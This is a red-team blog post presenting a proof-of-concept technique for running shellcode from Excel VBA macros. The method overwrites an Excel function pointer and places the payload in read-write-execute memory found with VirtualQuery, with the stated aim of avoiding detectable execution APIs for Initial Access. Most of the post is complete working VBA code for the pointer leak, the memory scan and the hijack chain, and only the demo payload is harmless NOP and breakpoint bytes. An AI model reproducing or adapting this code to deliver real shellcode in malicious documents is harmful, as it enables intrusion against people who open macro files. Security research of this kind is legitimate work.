---
title: "VBA: having fun with macros, overwritten pointers & R/W/X memory"
date: 2024-01-12 00:00:00 +00:00
modified: 2024-01-12 00:00:00 +00:00
tags: [red team, research, VBA, macros, X-C3LL]
description: Article describing an alternative method to trigger shellcode execution
image: 
---


Dear Fell**owl**ship, today's homily is about an epiphany one of our owls had a couple of weekends ago: an alternative way for running shellcodes in macros. Please, take a seat and listen the story.
# Prayers at the foot of the Altar a.k.a. disclaimer
*I am writing this article because I had fun last weekend researching this and wanted to share my findings. Maybe this could be useful to someone, but to be honest my only intention is to use this post as a note to myself in the future. Keep in mind this is just a proof of concept.*
*Also, if you are going to replicate anything explained here you need to place the code AS A NEW MODULE.*


# All roads lead to Rome
Generally speaking, to a greater or lesser degree, any macro designed to self-inject a shellcode inside its own process would follow the next steps:
1. Allocate memory
2. Copy the shellcode
3. Set perms
4. Trigger execution

Of course this is just an extremely summarized view of how this kind of macros works. In our times, where Initial Access has became far more difficult than 5 years ago,  additional stuff is needed to setup the injection: unhooking, syscalling, etc.

Previously in this blog I explored different functions that could be used to copy the shellcode to a buffer ("[One thousand and one ways to copy your shellcode to memory (VBA Macros)](https://adepts.of0x.cc/alternatives-copy-shellcode/)"). About how to trigger execution [@nootrak](https://twitter.com/nootrak) wrote an article called "[Abusing native Windows functions for shellcode execution](http://ropgadget.com/posts/abusing_win_functions.html)". Years later it was found one of these documented functions (`lpLocaleEnumProc`) being used by Lazarus group (“[RIFT: Analysing a Lazarus Shellcode Execution Method](https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)”).

My previous article about VBA ("[VBA: resolving exports in runtime without NtQueryInformationProcess or GetProcAddress](https://adepts.of0x.cc/vba-exports-runtime/)") was based on the premise of being less explicit in the functions that are imported from DLLs. Or, to be more precise, to avoid as much as possible leaving traces in the code of what the macro does. In this case, we reduced as much as necessary and built everything with `RtlMoveMemory` and `DispCallFunc`

My quest now takes me down the path of trying to get code execution from an arbitrary memory address without using any of the functions documented by Nootrak.

# The art of taming pointers
In essence, if our goal is to get a shellcode executed in the context of our process... Isn't that exactly what exploiting does? In the end, what we need is to hijack the natural flow of the program so that the execution deviates from its natural course and jumps into our immaculate and perfumed shellcode. 

Therefore, the easiest thing to do would be to locate some pointer that we can overwrite that would be used later. But... memory space is dark and full of terrors. How can we find such a thing when VBA holds us captive in its prison?

Let's reuse part of the code from our previous post:
```vb
' The "declares" are needed to keep the layout. It's a long story
Private Declare PtrSafe Sub CopyMemory Lib "KERNEL32" Alias "RtlMoveMemory" ( _
                        ByVal Destination As LongPtr, _
                        ByVal Source As LongPtr, _
                        ByVal Length As Long)
                        
Private Declare PtrSafe Function NtClose Lib "ntdll" (ByVal ObjectHandle As LongPtr) As Long
Dim a As LongPtr

Function leak() As LongPtr
    a = 1337
    leak = VarPtr(a)
End Function


Sub test()
    Cells(1, 1) = "0x" & Hex(leak)
End Sub
```

If we check the address we can see there are a few pointers near:
<figure>
<img src="/VBA-hijack-pointers-rwa/Pointers near.png" alt="Pointers near our location"> 
<figcaption>
Juicy pointers
</figcaption>
</figure>


To check if any of them were interesting I got a little playful and overwrote them with rubbish to see if Excel would crash because it tried to execute memory at an invalid address. And the best candidate so far was the one highlighted in dark blue/black: `0x02238f...`. 

If we check that address we can see there is another pointer there:
<figure>
<img src="/VBA-hijack-pointers-rwa/A pointer pointing to a pointer.png" alt="A pointer pointing to a pointer"> 
<figcaption>
A pointer pointing to a pointer
</figcaption>
</figure>


And at that location we got an array of pointers to functions in Excel.

<figure>
<img src="/VBA-hijack-pointers-rwa/Pointers party.png" alt="Party"> 
<figcaption>
Party
</figcaption>
</figure>
If you follow the execution with the debugger you would see that the previous pointer is just the address of the array base, and then it uses an offset to jump to any of the pointers in the array. In this case, it always end jumping at `0xB0`. Summarized:

<figure>
<img src="/VBA-hijack-pointers-rwa/Diagram.png" alt="Diagram"> 
<figcaption>
Diagram
</figcaption>
</figure>
And to perform the hijack we need something like:
<figure>
<img src="/VBA-hijack-pointers-rwa/Hijack.png" alt="Attack diagram"> 
<figcaption>
Attack diagram
</figcaption>
</figure>

We need a buffer of data controlled by us, then place at `0xB0`inside the buffer the address where the shellcode is going to be (it can be placed just after the address, so it would be at buffer address + `0xB0` + 8).

At this point you should be thinking something like "but we need to turn the buffer into executable memory". And you are right, except by the fact that you can find memory with R/W/X perms inside Excel process __:)__

# Who wants to marry my shellcode?
So here comes the second part of the post. 
To recap we found a reliable way to hijack the program flow in order to jump to whatever we want. And whatever we want is a memory zone that let us write and execute. If we use `VirtualQuery` we can see that indeed we can find some allocations that fits our needs.

```vb
Private Type MEMORY_BASIC_INFORMATION
    BaseAddress As LongPtr
    AllocationBase As LongPtr
    AllocationProtect As Long
    RegionSize As LongPtr
    State As Long
    Protect As Long
    lType As Long
End Type

Private Declare PtrSafe Function VirtualQuery Lib "KERNEL32" (ByVal lpAddress As LongPtr, lpBuffer As MEMORY_BASIC_INFORMATION, ByVal dwLength As LongPtr) As LongPtr

Function getTarget() As LongPtr
    Dim mbi As MEMORY_BASIC_INFORMATION
    Dim ret As LongPtr
    Dim dwLenght As LongPtr
    Dim j As Long
    
    j = 1
    For i = 0 To 50000
        ret = VirtualQuery(addr, mbi, LenB(mbi))
        If mbi.Protect = 64 Then
            Cells(j, 1) = "0x" + Hex(mbi.BaseAddress)
            Cells(j, 2) = "0x" + Hex(mbi.RegionSize)
            j = j + 1
        End If
        addr = mbi.BaseAddress + mbi.RegionSize
    Next i
End Function

Sub test()
    a = getTarget()
End Sub
```
<figure>
<img src="/VBA-hijack-pointers-rwa/Suitable.png" alt="RWX!"> 
<figcaption>
RWX!
</figcaption>
</figure>

If you execute more dummy functions before you would see that the number of suitable allocations is increased. 

Keep in mind this is being used by the program, so overwriting it could end in a crash because you corrupted the heap or any data that the program would use later. Be careful, the best is trying to find a region full of zeroes and place there your shellcode. Unfortunately I barely found a region big enough and in all my tests I had to split the shellcode in smaller parts. 

If we glue all together:

```vb
Private Type MEMORY_BASIC_INFORMATION
    BaseAddress As LongPtr
    AllocationBase As LongPtr
    AllocationProtect As Long
    RegionSize As LongPtr
    State As Long
    Protect As Long
    lType As Long
End Type

Private Declare PtrSafe Function VirtualQuery Lib "KERNEL32" (ByVal lpAddress As LongPtr, lpBuffer As MEMORY_BASIC_INFORMATION, ByVal dwLength As LongPtr) As LongPtr
Private Declare PtrSafe Sub CopyMemory Lib "KERNEL32" Alias "RtlMoveMemory" ( _
                        ByVal Destination As LongPtr, _
                        ByVal Source As LongPtr, _
                        ByVal Length As Long)
                        
Private Declare PtrSafe Function NtClose Lib "ntdll" (ByVal ObjectHandle As LongPtr) As Long
Dim a As LongPtr

Function leak() As LongPtr
    Dim funcLeak As LongPtr
    Dim i As LongPtr
    Dim j As Long
    
    For i = 0 To 512 Step 8
        Call CopyMemory(VarPtr(funcLeak), VarPtr(a) + i, 8)
        If Left(Hex(funcLeak), 4) = Left(Hex(VarPtr(a)), 4) Then
            Cells(2, 2) = "0x" & Hex(funcLeak)
            Cells(2, 1) = "0x" & Hex(VarPtr(a))
            Exit For
        End If
    Next i
    leak = funcLeak
End Function

Function getTarget(counter As LongPtr) As LongPtr
    Dim mbi As MEMORY_BASIC_INFORMATION
    Dim ret As LongPtr
    Dim dwLenght As LongPtr
    Dim addr As LongPtr
    Dim check As LongPtr
    Dim j As LongPtr
    Dim k As LongPtr
    Dim napa As LongPtr
    addr = 0
    check = 1337
    
    For i = counter To 10000
        ret = VirtualQuery(addr, mbi, LenB(mbi))
        If mbi.Protect = 64 And mbi.RegionSize > 1024 Then
            For j = 0 To mbi.RegionSize - 100 Step 8
                napa = 1
                For k = 0 To 48 Step 8
                    Call CopyMemory(VarPtr(check), mbi.BaseAddress + j + k, 8)
                    If check <> 0 Then
                        napa = 2
                    End If
                Next k
                If napa = 1 Then
                    getTarget = mbi.BaseAddress + j
                    Exit For
                End If
            Next j
            Exit For
        End If
        addr = mbi.BaseAddress + mbi.RegionSize
    Next i
    Cells(1, 1) = "0x" + Hex(getTarget)
End Function

Sub test()
    Dim jmp As LongPtr
    Dim target As LongPtr
    Dim sc As LongPtr
    Dim check As LongPtr
    Dim buf As Variant
    Dim i As LongPtr
    jmp = leak
    check = 0
    '204 == 0xCC 144 == 0x90
    buf = Array(144, 144, 144, 144, 144, 204, 204, 204)

    target = getTarget(i)
    If target <> 0 Then
        sc = target + 8 + &HB0
        For n = LBound(buf) To UBound(buf)
            Call CopyMemory(sc + n, VarPtr(buf(n)) + 8, 8)
        Next n
    
        Call CopyMemory(target + &HB0, VarPtr(sc), 8)
        Call CopyMemory(jmp, VarPtr(target), 8)
    Else
        MsgBox "Cave not found!"
    End If
End Sub
```
<figure>
<img src="/VBA-hijack-pointers-rwa/Code execution.png" alt="Shellcode executed!"> 
<figcaption>
Shellcode executed!
</figcaption>
</figure>


# All that glitters is not gold
*Update[07/07/2024]: We found a reliable way to execute the whole chain, so there are no drabacks!. Check the technique in our article "[VBA: overwriting R/W/X memory in a reliable way](https://adepts.of0x.cc/VBA-RWX-ADDENDUM/)"*

~This idea has tons of drawbacks. Although I have a reliable way to find the pointer to hijack, if I execute other stuff previously in the same process (e.g. a few innocent macros that do a lot of activity) sometimes (5%) the pointer I abuse is misplaced and I overwrite other that has no effect or it crashes the process.~

~On the other hand, it can be difficult to handle a big shellcode as it is really easy to overwrite something critical. I am pretty sure there is a way to find suitable regions and avoid this issue, but my knowledge is very light on these matters.~

# EoF

We hope you enjoyed this reading! Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).



